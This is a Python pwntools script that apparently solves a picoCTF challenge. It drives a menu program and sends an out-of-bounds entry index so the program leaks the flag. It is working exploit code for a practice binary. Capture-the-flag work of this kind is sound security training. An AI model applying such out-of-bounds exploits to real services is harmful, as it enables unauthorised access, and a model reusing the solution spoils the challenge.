#!/usr/bin/env python3
from pwn import *
from sys import argv

def run():
	if len(argv) == 3:
		return remote(argv[1], argv[2])
	else:
		return process("./program-redacted.elf")

context.encoding = "ascii"
context.log_level = "error"

with run() as p:
	# It is required to add at least one entry first
	# So Navigate to entering a phrase and add some data
	p.recvuntil("Type '3' to exit the program")
	p.clean()
	p.sendline("1")
	p.recvuntil("Please enter your data:")
	p.clean()
	p.sendline("foobar")
	p.recvuntil("Please enter the length of your data:")
	p.clean()
	p.sendline("6")

	# Now we can switch to echoing
	p.recvuntil("Write successful, would you like to do anything else?")
	p.clean()
	p.sendline("2")

	# Send the out-of-bounds request
	p.recvuntil("Please enter the entry number of your data:")
	p.clean()
	p.sendline("0")
	p.recvuntil("picoCTF")
	flag = (b"picoCTF" + p.recvall()).strip().decode("ascii")

info(f"The flag is: {flag}")
print(flag)
